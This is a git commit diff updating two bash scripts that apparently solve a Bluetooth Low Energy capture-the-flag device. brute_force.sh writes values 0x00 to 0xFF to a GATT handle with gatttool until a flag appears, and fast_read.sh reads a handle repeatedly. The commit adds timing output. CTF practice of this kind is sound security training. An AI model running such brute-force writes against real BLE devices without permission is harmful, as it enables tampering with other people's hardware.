7655c924097e8f00157c4face952d594ab0c0bdf
Eric Gaston <eegeek1986@gmail.com>
2020-06-17 07:47:08 -0400

    updated 2 scripts to calculate time needed

--- ble_ctf_scripts/brute_force.sh
+++ ble_ctf_scripts/brute_force.sh
@@ -6,16 +6,20 @@ then
     exit
 fi
 
+start_time=$(date -u +%s)
+
 for i in {0..255}
 do
-    echo -n "Trying $i: "
-    x=$(printf "%x" $i)
+    x=$(printf "%X" $i)
+    echo -n "Trying 0x$x: "
     gatttool -b $1 --char-write-req -a $2 -n $(echo -ne "\x$x" | xxd -ps)
     resp=$(gatttool -b $1 --char-read -a $2|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p)
 
     if [ "$resp" != "Brute force my value 00 to ff" ];
     then
-       echo -n "$i worked, here is your flag: "
+       end_time=$(date -u +%s)
+       total_time="$(($end_time-$start_time))"
+       echo -n "Took $total_time seconds to find 0x$x. here is your flag: "
        echo $resp
        exit
     fi   
--- ble_ctf_scripts/fast_read.sh
+++ ble_ctf_scripts/fast_read.sh
@@ -6,14 +6,20 @@ then
     exit
 fi
 
+i=0
+echo "Starting reads"
+start_time=$(date -u +%s)
 
 while true;
 do
     resp=$(gatttool -b $1 --char-read -a $2|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p)
     if [ "$resp" != "Read me 1000 times" ];
     then
-       echo -n "Done, here is your flag: "
+       end_time=$(date -u +%s)
+       total_time="$(($end_time-$start_time))"
+       echo -n "$i reads done in $total_time seconds, here is your flag: "
        echo $resp
        exit
-    fi   
+    fi
+    i="$(($i + 1))"
 done
